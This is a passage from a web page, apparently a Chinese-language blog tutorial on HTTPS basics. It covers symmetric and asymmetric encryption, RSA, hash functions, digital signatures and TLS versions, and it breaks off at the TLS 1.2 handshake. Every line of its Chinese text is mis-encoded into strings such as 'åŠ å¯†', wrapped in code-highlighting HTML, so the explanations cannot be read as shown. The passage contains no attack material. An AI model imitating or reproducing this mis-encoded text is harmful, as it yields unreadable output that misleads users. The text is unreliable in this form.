æ•°å­—è¯ä¹¦ï¼šéªŒè¯èº«ä»½<br><span class="hljs-bullet">-</span> æ¶ˆæ¯æ‘˜è¦ï¼šéªŒè¯å®Œæ•´æ€§<br></code></pre></td></tr></table></figure><hr><h2 id="2-åŠ å¯†åŸºç¡€"><a href="#2-åŠ å¯†åŸºç¡€" class="headerlink" title="2. åŠ å¯†åŸºç¡€"></a>2. åŠ å¯†åŸºç¡€</h2><h3 id="2-1-å¯¹ç§°åŠ å¯†"><a href="#2-1-å¯¹ç§°åŠ å¯†" class="headerlink" title="2.1 å¯¹ç§°åŠ å¯†"></a>2.1 å¯¹ç§°åŠ å¯†</h3><p><strong>æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å¯¹ç§°åŠ å¯† = åŠ å¯†å’Œè§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥<br><br>ç”Ÿæ´»ç±»æ¯”ï¼š<br>ä¿é™©ç®±ï¼š<br><span class="hljs-bullet">-</span> ä¸€æŠŠé’¥åŒ™<br><span class="hljs-bullet">-</span> ç”¨å®ƒé”é—¨<br><span class="hljs-bullet">-</span> ç”¨å®ƒå¼€é—¨<br><br>Alice â†’ Bobï¼š<br><span class="hljs-bullet">1.</span> Aliceæœ‰å¯†é’¥K<br><span class="hljs-bullet">2.</span> Aliceç”¨KåŠ å¯†æ¶ˆæ¯<br><span class="hljs-bullet">3.</span> Bobç”¨Kè§£å¯†æ¶ˆæ¯<br><span class="hljs-bullet">4.</span> å‰æï¼šAliceå’ŒBobéƒ½çŸ¥é“K<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§ç®—æ³•</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">AESï¼ˆAdvanced Encryption Standardï¼‰<br><span class="hljs-bullet">- </span>æœ€å¸¸ç”¨<br><span class="hljs-bullet">- </span>é€Ÿåº¦å¿«<br><span class="hljs-bullet">- </span>å®‰å…¨æ€§é«˜<br><span class="hljs-bullet">- </span>å¯†é’¥é•¿åº¦ï¼š128/192/256ä½<br><br>DESï¼ˆData Encryption Standardï¼‰<br><span class="hljs-bullet">- </span>å·²è¢«æ·˜æ±°<br><span class="hljs-bullet">- </span>å¯†é’¥å¤ªçŸ­ï¼ˆ56ä½ï¼‰<br><span class="hljs-bullet">- </span>ä¸å®‰å…¨<br><br>3DESï¼ˆTriple DESï¼‰<br><span class="hljs-bullet">- </span>DESçš„åŠ å¼ºç‰ˆ<br><span class="hljs-bullet">- </span>ä½¿ç”¨ä¸‰æ¬¡DES<br><span class="hljs-bullet">- </span>é€æ¸è¢«AESå–ä»£<br><br>ChaCha20<br><span class="hljs-bullet">- </span>ç§»åŠ¨è®¾å¤‡å‹å¥½<br><span class="hljs-bullet">- </span>Googleæ¨è<br><span class="hljs-bullet">- </span>é€Ÿåº¦å¿«<br></code></pre></td></tr></table></figure><p><strong>å·¥ä½œæ¨¡å¼</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ECBï¼ˆElectronic Codebookï¼‰<br><span class="hljs-bullet">- </span>æœ€ç®€å•<br><span class="hljs-bullet">- </span>ä¸å®‰å…¨ï¼ˆç›¸åŒæ˜æ–‡â†’ç›¸åŒå¯†æ–‡ï¼‰<br><span class="hljs-bullet">- </span>ä¸æ¨è<br><br>CBCï¼ˆCipher Block Chainingï¼‰<br><span class="hljs-bullet">- </span>å¸¸ç”¨<br><span class="hljs-bullet">- </span>æ¯ä¸ªå—ä¾èµ–å‰ä¸€ä¸ªå—<br><span class="hljs-bullet">- </span>éœ€è¦åˆå§‹å‘é‡ï¼ˆIVï¼‰<br><br>GCMï¼ˆGalois/Counter Modeï¼‰<br><span class="hljs-bullet">- </span>æ¨è<br><span class="hljs-bullet">- </span>è®¤è¯åŠ å¯†<br><span class="hljs-bullet">- </span>TLS 1.3ä½¿ç”¨<br></code></pre></td></tr></table></figure><p><strong>å¯¹ç§°åŠ å¯†çš„é—®é¢˜</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å¯†é’¥åˆ†å‘é—®é¢˜ï¼š<br><br>Aliceæƒ³å’ŒBobé€šä¿¡ï¼š<br><span class="hljs-bullet">1.</span> Aliceç”Ÿæˆå¯†é’¥K<br><span class="hljs-bullet">2.</span> å¦‚ä½•å®‰å…¨åœ°æŠŠKä¼ ç»™Bobï¼Ÿ<br><span class="hljs-bullet">   -</span> ç½‘ç»œä¼ è¾“ï¼Ÿä¸å®‰å…¨ï¼Œä¼šè¢«æˆªè·<br><span class="hljs-bullet">   -</span> çº¿ä¸‹äº¤æ¢ï¼Ÿä¸ç°å®<br><br>å¤šäººé€šä¿¡é—®é¢˜ï¼š<br>nä¸ªäººä¸¤ä¸¤é€šä¿¡<br>éœ€è¦ nÃ—(n-1)/2 ä¸ªå¯†é’¥<br>100ä¸ªäºº â†’ 4950ä¸ªå¯†é’¥ âŒ<br></code></pre></td></tr></table></figure><h3 id="2-2-éå¯¹ç§°åŠ å¯†"><a href="#2-2-éå¯¹ç§°åŠ å¯†" class="headerlink" title="2.2 éå¯¹ç§°åŠ å¯†"></a>2.2 éå¯¹ç§°åŠ å¯†</h3><p><strong>æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">éå¯¹ç§°åŠ å¯† = å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†<br><br>å¯†é’¥å¯¹ï¼š<br><span class="hljs-bullet">- </span>å…¬é’¥ï¼ˆPublic Keyï¼‰ï¼šå…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥ç”¨<br><span class="hljs-bullet">- </span>ç§é’¥ï¼ˆPrivate Keyï¼‰ï¼šç§å¯†çš„ï¼Œåªæœ‰è‡ªå·±çŸ¥é“<br><br>å…³ç³»ï¼š<br><span class="hljs-bullet">- </span>å…¬é’¥åŠ å¯† â†’ ç§é’¥è§£å¯†<br><span class="hljs-bullet">- </span>ç§é’¥åŠ å¯† â†’ å…¬é’¥è§£å¯†<br><br>ç”Ÿæ´»ç±»æ¯”ï¼š<br>é‚®ç®±ï¼š<br><span class="hljs-bullet">- </span>é‚®ç®±å£ï¼ˆå…¬é’¥ï¼‰ï¼šä»»ä½•äººéƒ½èƒ½æŠ•ä¿¡<br><span class="hljs-bullet">- </span>é‚®ç®±é’¥åŒ™ï¼ˆç§é’¥ï¼‰ï¼šåªæœ‰ä¸»äººèƒ½å–ä¿¡<br></code></pre></td></tr></table></figure><p><strong>RSAç®—æ³•</strong>ï¼š</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs excel">RSAï¼ˆRivest-Shamir-Adlemanï¼‰<br><br>å¯†é’¥ç”Ÿæˆï¼š<br><span class="hljs-number">1</span>. é€‰æ‹©ä¸¤ä¸ªå¤§è´¨æ•° p å’Œ q<br><span class="hljs-number">2</span>. è®¡ç®— <span class="hljs-built_in">n</span> = p Ã— q<br><span class="hljs-number">3</span>. è®¡ç®— Ï†(<span class="hljs-built_in">n</span>) = (p-<span class="hljs-number">1</span>) Ã— (q-<span class="hljs-number">1</span>)<br><span class="hljs-number">4</span>. é€‰æ‹© eï¼ˆå…¬é’¥æŒ‡æ•°ï¼‰ï¼Œé€šå¸¸æ˜¯ <span class="hljs-number">65537</span><br><span class="hljs-number">5</span>. è®¡ç®— dï¼ˆç§é’¥æŒ‡æ•°ï¼‰ï¼Œæ»¡è¶³ eÃ—d â‰¡ <span class="hljs-number">1</span> (<span class="hljs-built_in">mod</span> Ï†(<span class="hljs-built_in">n</span>))<br><br>å…¬é’¥ï¼š(<span class="hljs-built_in">n</span>, e)<br>ç§é’¥ï¼š(<span class="hljs-built_in">n</span>, d)<br><br>åŠ å¯†ï¼šc = m^e <span class="hljs-built_in">mod</span> <span class="hljs-built_in">n</span><br>è§£å¯†ï¼šm = c^d <span class="hljs-built_in">mod</span> <span class="hljs-built_in">n</span><br><br>å¯†é’¥é•¿åº¦ï¼š<br>- <span class="hljs-number">1024</span>ä½ï¼ˆä¸å†å®‰å…¨ï¼‰<br>- <span class="hljs-number">2048</span>ä½ï¼ˆå½“å‰æ¨èï¼‰<br>- <span class="hljs-number">4096</span>ä½ï¼ˆæ›´å®‰å…¨ï¼Œä½†æ…¢ï¼‰<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æ•°å­—ç­¾å<br><span class="hljs-bullet">   -</span> ç§é’¥ç­¾å<br><span class="hljs-bullet">   -</span> å…¬é’¥éªŒè¯<br><span class="hljs-bullet">   -</span> è¯æ˜èº«ä»½<br><br><span class="hljs-bullet">2.</span> å¯†é’¥äº¤æ¢<br><span class="hljs-bullet">   -</span> ç”¨å…¬é’¥åŠ å¯†å¯¹ç§°å¯†é’¥<br><span class="hljs-bullet">   -</span> ç§é’¥è§£å¯†å¾—åˆ°å¯¹ç§°å¯†é’¥<br><span class="hljs-bullet">   -</span> åç»­ä½¿ç”¨å¯¹ç§°åŠ å¯†é€šä¿¡<br><br><span class="hljs-bullet">3.</span> æ•°å­—è¯ä¹¦<br><span class="hljs-bullet">   -</span> CAç”¨ç§é’¥ç­¾åè¯ä¹¦<br><span class="hljs-bullet">   -</span> æµè§ˆå™¨ç”¨å…¬é’¥éªŒè¯<br></code></pre></td></tr></table></figure><p><strong>éå¯¹ç§°åŠ å¯†çš„é—®é¢˜</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é€Ÿåº¦æ…¢ï¼š<br><span class="hljs-bullet">-</span> æ¯”å¯¹ç§°åŠ å¯†æ…¢100-1000å€<br><span class="hljs-bullet">-</span> ä¸é€‚åˆåŠ å¯†å¤§é‡æ•°æ®<br><br>è§£å†³æ–¹æ¡ˆï¼ˆæ··åˆåŠ å¯†ï¼‰ï¼š<br><span class="hljs-bullet">1.</span> éå¯¹ç§°åŠ å¯†ï¼šäº¤æ¢å¯¹ç§°å¯†é’¥ï¼ˆåªç”¨ä¸€æ¬¡ï¼‰<br><span class="hljs-bullet">2.</span> å¯¹ç§°åŠ å¯†ï¼šåŠ å¯†å®é™…æ•°æ®ï¼ˆå¿«é€Ÿï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-3-å“ˆå¸Œå‡½æ•°"><a href="#2-3-å“ˆå¸Œå‡½æ•°" class="headerlink" title="2.3 å“ˆå¸Œå‡½æ•°"></a>2.3 å“ˆå¸Œå‡½æ•°</h3><p><strong>æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">å“ˆå¸Œå‡½æ•° = å•å‘å‡½æ•°ï¼Œä¸å¯é€†<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>ä»»æ„é•¿åº¦è¾“å…¥ â†’ å›ºå®šé•¿åº¦è¾“å‡º<br><span class="hljs-bullet">- </span>ç›¸åŒè¾“å…¥ â†’ ç›¸åŒè¾“å‡º<br><span class="hljs-bullet">- </span>ä¸åŒè¾“å…¥ â†’ å‡ ä¹ä¸å¯èƒ½ç›¸åŒè¾“å‡º<br><span class="hljs-bullet">- </span>æ— æ³•ä»è¾“å‡ºæ¨å¯¼è¾“å…¥ï¼ˆå•å‘ï¼‰<br><br>ç”¨é€”ï¼š<br><span class="hljs-bullet">- </span>éªŒè¯æ•°æ®å®Œæ•´æ€§<br><span class="hljs-bullet">- </span>å¯†ç å­˜å‚¨<br><span class="hljs-bullet">- </span>æ•°å­—ç­¾å<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§ç®—æ³•</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MD5ï¼ˆMessage Digest 5ï¼‰<br><span class="hljs-bullet">- </span>128ä½ï¼ˆ16å­—èŠ‚ï¼‰<br><span class="hljs-bullet">- </span>å·²è¢«ç ´è§£<br><span class="hljs-bullet">- </span>ä¸å†å®‰å…¨<br><span class="hljs-bullet">- </span>åªç”¨äºéå®‰å…¨åœºæ™¯ï¼ˆæ–‡ä»¶æ ¡éªŒï¼‰<br><br>SHA-1ï¼ˆSecure Hash Algorithm 1ï¼‰<br><span class="hljs-bullet">- </span>160ä½ï¼ˆ20å­—èŠ‚ï¼‰<br><span class="hljs-bullet">- </span>å·²è¢«ç ´è§£<br><span class="hljs-bullet">- </span>Googleå·²å¼ƒç”¨<br><br>SHA-2å®¶æ—<br><span class="hljs-bullet">- </span>SHA-224ã€SHA-256ã€SHA-384ã€SHA-512<br><span class="hljs-bullet">- </span>æ¨èä½¿ç”¨SHA-256<br><span class="hljs-bullet">- </span>å®‰å…¨<br><br>SHA-3<br><span class="hljs-bullet">- </span>æœ€æ–°æ ‡å‡†<br><span class="hljs-bullet">- </span>æ›´å®‰å…¨<br><span class="hljs-bullet">- </span>å°šæœªå¹¿æ³›ä½¿ç”¨<br><br>ç¤ºä¾‹ï¼š<br>è¾“å…¥ï¼šHello World<br>SHA-256ï¼ša591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e<br></code></pre></td></tr></table></figure><h3 id="2-4-æ•°å­—ç­¾å"><a href="#2-4-æ•°å­—ç­¾å" class="headerlink" title="2.4 æ•°å­—ç­¾å"></a>2.4 æ•°å­—ç­¾å</h3><p><strong>åŸç†</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ•°å­—ç­¾å = è¯æ˜æ¶ˆæ¯æ¥è‡ªç‰¹å®šå‘é€è€…<br><br>æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> Aliceè®¡ç®—æ¶ˆæ¯çš„å“ˆå¸Œå€¼<br><span class="hljs-bullet">2.</span> Aliceç”¨ç§é’¥åŠ å¯†å“ˆå¸Œå€¼ï¼ˆç­¾åï¼‰<br><span class="hljs-bullet">3.</span> Aliceå‘é€ï¼šæ¶ˆæ¯ + ç­¾å<br><br>éªŒè¯ï¼š<br><span class="hljs-bullet">1.</span> Bobæ”¶åˆ°ï¼šæ¶ˆæ¯ + ç­¾å<br><span class="hljs-bullet">2.</span> Bobç”¨Aliceçš„å…¬é’¥è§£å¯†ç­¾åï¼Œå¾—åˆ°å“ˆå¸Œå€¼H1<br><span class="hljs-bullet">3.</span> Bobè®¡ç®—æ¶ˆæ¯çš„å“ˆå¸Œå€¼H2<br><span class="hljs-bullet">4.</span> æ¯”è¾ƒH1å’ŒH2<br><span class="hljs-bullet">   -</span> ç›¸åŒï¼šç­¾åæœ‰æ•ˆ<br><span class="hljs-bullet">   -</span> ä¸åŒï¼šè¢«ç¯¡æ”¹æˆ–ä¼ªé€ <br><br>ä½œç”¨ï¼š<br>âœ… èº«ä»½è®¤è¯ï¼šç¡®è®¤å‘é€è€…<br>âœ… å®Œæ•´æ€§ï¼šæ¶ˆæ¯æœªè¢«ç¯¡æ”¹<br>âœ… ä¸å¯å¦è®¤ï¼šå‘é€è€…æ— æ³•å¦è®¤<br></code></pre></td></tr></table></figure><hr><h2 id="3-TLS-SSLåè®®"><a href="#3-TLS-SSLåè®®" class="headerlink" title="3. TLS&#x2F;SSLåè®®"></a>3. TLS&#x2F;SSLåè®®</h2><h3 id="3-1-SSL-vs-TLS"><a href="#3-1-SSL-vs-TLS" class="headerlink" title="3.1 SSL vs TLS"></a>3.1 SSL vs TLS</h3><p><strong>å†å²</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">SSLï¼ˆSecure Sockets Layerï¼‰<br><span class="hljs-bullet">- </span>1994: SSL 1.0ï¼ˆæœªå‘å¸ƒï¼‰<br><span class="hljs-bullet">- </span>1995: SSL 2.0ï¼ˆæœ‰ä¸¥é‡æ¼æ´ï¼‰<br><span class="hljs-bullet">- </span>1996: SSL 3.0<br><br>TLSï¼ˆTransport Layer Securityï¼‰<br><span class="hljs-bullet">- </span>1999: TLS 1.0ï¼ˆåŸºäºSSL 3.0ï¼‰<br><span class="hljs-bullet">- </span>2006: TLS 1.1<br><span class="hljs-bullet">- </span>2008: TLS 1.2ï¼ˆå½“å‰ä¸»æµï¼‰<br><span class="hljs-bullet">- </span>2018: TLS 1.3ï¼ˆæœ€æ–°ï¼‰<br><br>å…³ç³»ï¼š<br>TLSæ˜¯SSLçš„å‡çº§ç‰ˆ<br>ä¹ æƒ¯ä¸Šä»ç§°ä¸ºSSL<br>ä½†å®é™…ä¸Šéƒ½æ˜¯TLS<br></code></pre></td></tr></table></figure><p><strong>ç‰ˆæœ¬å¯¹æ¯”</strong>ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  ç‰ˆæœ¬    â”‚   çŠ¶æ€   â”‚   å®‰å…¨æ€§ â”‚   æ€§èƒ½   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ SSL 2.0  â”‚   ç¦ç”¨   â”‚    ä½    â”‚    å·®    â”‚<br>â”‚ SSL 3.0  â”‚   ç¦ç”¨   â”‚    ä½    â”‚    å·®    â”‚<br>â”‚ TLS 1.0  â”‚   å¼ƒç”¨   â”‚    ä¸­    â”‚    ä¸­    â”‚<br>â”‚ TLS 1.1  â”‚   å¼ƒç”¨   â”‚    ä¸­    â”‚    ä¸­    â”‚<br>â”‚ TLS 1.2  â”‚  æ¨è    â”‚    é«˜    â”‚    ä¸­    â”‚<br>â”‚ TLS 1.3  â”‚  æœ€æ–°    â”‚   æœ€é«˜   â”‚    é«˜    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>æ¨èï¼š<br>åªä½¿ç”¨TLS 1.2å’ŒTLS 1.3<br>ç¦ç”¨æ‰€æœ‰SSLå’Œæ—§ç‰ˆTLS<br></code></pre></td></tr></table></figure><h3 id="3-2-TLSåè®®æ ˆ"><a href="#3-2-TLSåè®®æ ˆ" class="headerlink" title="3.2 TLSåè®®æ ˆ"></a>3.2 TLSåè®®æ ˆ</h3><p><strong>åˆ†å±‚ç»“æ„</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚        åº”ç”¨å±‚ï¼ˆHTTPç­‰ï¼‰          â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚      TLS Handshake Protocol     â”‚  æ¡æ‰‹åè®®<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚   TLS Change Cipher Spec        â”‚  åˆ‡æ¢å¯†ç åè®®<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚      TLS Alert Protocol         â”‚  è­¦æŠ¥åè®®<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚      TLS Record Protocol        â”‚  è®°å½•åè®®<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚           TCP                   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>è®°å½•åè®®ï¼ˆRecord Protocolï¼‰ï¼š<br><span class="hljs-bullet">- </span>åˆ†æ®µã€å‹ç¼©ã€åŠ å¯†ã€è®¤è¯<br><span class="hljs-bullet">- </span>ä¼ è¾“åŠ å¯†æ•°æ®<br><br>æ¡æ‰‹åè®®ï¼ˆHandshake Protocolï¼‰ï¼š<br><span class="hljs-bullet">- </span>åå•†åŠ å¯†ç®—æ³•<br><span class="hljs-bullet">- </span>äº¤æ¢å¯†é’¥<br><span class="hljs-bullet">- </span>éªŒè¯èº«ä»½<br></code></pre></td></tr></table></figure><hr><h2 id="4-HTTPSæ¡æ‰‹è¿‡ç¨‹"><a href="#4-HTTPSæ¡æ‰‹è¿‡ç¨‹" class="headerlink" title="4. HTTPSæ¡æ‰‹è¿‡ç¨‹"></a>4. HTTPSæ¡æ‰‹è¿‡ç¨‹</h2><h3 id="4-1-TLS-1-2-æ¡æ‰‹ï¼ˆRSAï¼‰"><a href="#4-1-TLS-1-2-æ¡æ‰‹ï¼ˆRSAï¼‰" class="headerlink" title="4.1 TLS 1.2 æ¡æ‰‹ï¼ˆRSAï¼‰"></a>4.1 TLS 1.2 æ¡æ‰‹ï¼ˆRSAï¼‰</h3><p><strong>å®Œæ•´æµç¨‹</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å®¢æˆ·ç«¯                                  æœåŠ¡å™¨<br><br><span class="hljs-bullet">1.</span> ClientHello<br>   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;<br><span class="hljs-bullet">   -</span> æ”¯æŒçš„TLSç‰ˆæœ¬<br><span class="hljs-bullet">   -</span> æ”¯æŒçš„åŠ å¯†å¥—ä»¶<br><span class="hljs-bullet">   -</span> éšæœºæ•°ï¼ˆClient Randomï¼‰<br><br><span class="hljs-bullet">2.</span> ServerHello<br>   